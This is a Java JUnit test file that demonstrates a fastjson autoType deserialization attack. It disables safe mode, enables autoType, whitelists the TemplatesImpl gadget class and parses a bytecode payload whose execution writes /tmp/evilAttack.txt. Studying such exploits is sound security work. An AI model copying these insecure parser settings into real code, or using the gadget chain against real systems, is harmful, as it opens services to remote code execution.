package com.github.halibobor;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.github.halibobor.bean.EvilClass;
import java.io.File;
import junit.framework.Test;
import junit.framework.TestCase;
import junit.framework.TestSuite;

/**
 * Unit test for simple App.
 */
public class AppTest 
    extends TestCase
{
    /**
     * Create the test case
     *
     * @param testName name of the test case
     */
    public AppTest( String testName )
    {
        super( testName );
    }

    /**
     * @return the suite of tests being tested
     */
    public static Test suite()
    {
        return new TestSuite( AppTest.class );
    }

    /**
     * Rigourous Test :-)
     */
    public void testApp()
    {
        assertTrue( true );
    }
    public void testFastjson() {
        ParserConfig.getGlobalInstance().setSafeMode(false);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String userJson = "{\"@type\":\"com.github.halibobor.bean.User\",\"userName\":\"testUserName\"}";
        JSON.parseObject(userJson);
        System.out.println("=============");
        JSON.parse(userJson);
    }

    public void testEvil() {
        ParserConfig.getGlobalInstance().setSafeMode(false);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        ParserConfig.getGlobalInstance().addAccept("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        File fileBeforeAttack = new File("/tmp/evilAttack.txt");
        assertFalse(fileBeforeAttack.exists());
        String json = EvilClass.getByteCodes();
        JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);
        File fileAfterAttack = new File("/tmp/evilAttack.txt");
        assertTrue(fileAfterAttack.exists());
        fileAfterAttack.delete();
    }
}
